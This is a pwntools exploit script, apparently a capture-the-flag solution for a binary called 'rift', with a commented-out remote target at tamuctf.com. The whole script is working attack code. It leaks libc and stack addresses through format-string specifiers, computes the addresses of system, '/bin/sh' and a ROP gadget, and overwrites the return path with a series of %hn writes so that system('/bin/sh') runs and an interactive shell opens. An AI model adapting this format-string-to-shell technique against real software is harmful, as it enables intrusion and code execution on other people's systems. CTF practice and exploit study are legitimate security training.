#!/usr/bin/env python3
from pwn import *
exe = ELF("rift_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.28.so")
p = process([exe.path])
# p= remote("tamuctf.com", 443, ssl=True, sni="rift")

def GDB():
    context.terminal = ["alacritty", "-e"]
    gdb.attach(p, gdbscript='''
    # b*vuln+39
    b*main+30


           ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def delete():
    input()
    sl(b"%41$n")


def main():
    GDB()
    
    payload = b"%11$p"
    input()
    sl(payload)
    addr = int(p.recvline(),16)
    base = addr - 0x2409b
    system_libc = base + libc.symbols["system"]
    pop_rdi = base + 0x0000000000023a5f
    bin_sh = base + 0x18052c 
    payload = b"%8$p"
    input()
    sl(payload)
    stack = int(p.recvline(),16)
    writeaddr = stack -8
    cmp_value = stack-0x14
    break_loop = stack -20
    
    # log.info(f"write addr: " + hex(writeaddr))

    # log.info(f"system: " + hex(system_libc))
    # log.info(f"bin_sh: " + hex(bin_sh))
    log.info(f"addr: " + hex(addr))
    one_gadget = base + 0xe5306
    target = stack +0x8
    log.info(f"target" + hex(target))
    log.info(f"base: "+ hex(base))
    log.info(f"one: " + hex(one_gadget))
    input()
    sl(f"%{target&0xffff}c%27$hn".encode())
    input()
    sl(f"%{pop_rdi&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{bin_sh&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8+2)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{(bin_sh>>16 &0xffff)&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8+2+2)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{(bin_sh>>32)&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8+8)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{system_libc&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8+8+2)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{(system_libc>>16 &0xffff)&0xffff}c%41$hn".encode())
    input()
    sl(f"%{(target+8+8+2+2)&0xffff}c%27$hn".encode())
    input()
    sl(f"%{(system_libc>>32)&0xffff}c%41$hn".encode())
    input()
    sl(f"%{break_loop&0xffff}c%27$hn".encode())
    delete()
    # good luck pwning :)




    p.interactive()





















if __name__ == "__main__":
    main()
